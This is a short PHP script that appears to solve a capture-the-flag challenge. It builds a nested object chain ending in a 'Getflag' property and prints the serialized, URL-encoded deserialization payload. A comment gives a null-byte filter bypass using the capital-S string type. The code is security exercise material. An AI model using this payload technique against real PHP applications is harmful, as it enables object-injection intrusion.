<?php 
//3<---1<---2<---4
class rank3{
    private $admin = 'aaa';
    protected $passwd = '123456';
	public function __construct(){
		$this->admin ='r3a';
		$this->passwd = 'r3b';
	}

}

class rank1{
	public $r1a;
    public $r1b;
	public function __construct(){
        $this->r1a=new rank3();
        $this->r1b='Getflag';
    }

}

class rank2{
	public $r2a;
	public function __construct(){
		$this->r2a = new rank1();
	}
}
class rank4{
	public $r4a;
	public function __construct(){
        $this->r4a=new rank2();
    }
}

//3<---1<---2<---4
$a=new rank4();
echo serialize( $a )."\n";
echo urlencode(serialize($a));

// %00如何绕过???
//https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html


// %00
// /00->
// O:5:"rank4":1:{s:3:"r4a";O:5:"rank2":1:{s:3:"r2a";O:5:"rank1":2:{s:3:"r1a";O:5:"rank3":2:{S:12:"\00rank3\00admin";s:3:"r3a";S:9:"\00*\00passwd";s:3:"r3b";}s:3:"r1b";s:7:"Getflag";}}}
// https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0DRDB73RDfx05%2BbDyimC0QQDg7iABoD&alichlgref=https%3A%2F%2Fwww.google.com%2F